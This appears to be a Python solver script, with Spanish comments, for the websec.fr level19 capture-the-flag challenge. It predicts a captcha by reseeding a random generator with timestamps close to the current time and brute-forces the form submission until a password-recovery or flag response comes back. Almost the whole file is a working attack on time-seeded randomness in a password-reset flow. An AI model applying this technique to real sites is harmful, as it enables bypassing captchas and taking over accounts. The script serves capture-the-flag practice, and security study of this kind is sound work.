import requests
import time

def generate_random_text(length, seed):
    import random
    random.seed(seed)
    chars = "abcdefghijklmnopqrstuvwxyz"
    chars += "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    chars += "1234567890"
    
    text = ''
    for i in range(int(length)):
        text += chars[random.randint(0, len(chars)-1)]
    return text

url = "https://websec.fr/level19/index.php"
s = requests.Session()

# Obtener la página para inicializar la sesión y obtener el token
r = s.get(url)
token_start = r.text.find('value="') + len('value="')
token_end = r.text.find('"', token_start)
token = r.text[token_start:token_end]

print(f"Token: {token}")

# Probar con diferentes seeds alrededor del tiempo actual
current = int(time.time())
for offset in range(-3, 4):
    seed = current + offset
    captcha = generate_random_text(255 / 10.0, seed)
    print(f"Intentando seed {seed}: {captcha[:20]}...")
    
    r = s.post(url, data={
        'captcha': captcha,
        'token': token,
        'submit': ''
    })
    
    if 'Password recovery email sent' in r.text or 'WEBSEC{' in r.text:
        print(f"\n¡Éxito con seed {seed}!")
        print(r.text)
        break
    elif 'Invalid captcha' not in r.text:
        print(f"Respuesta diferente con seed {seed}")
        print(r.text[:500])
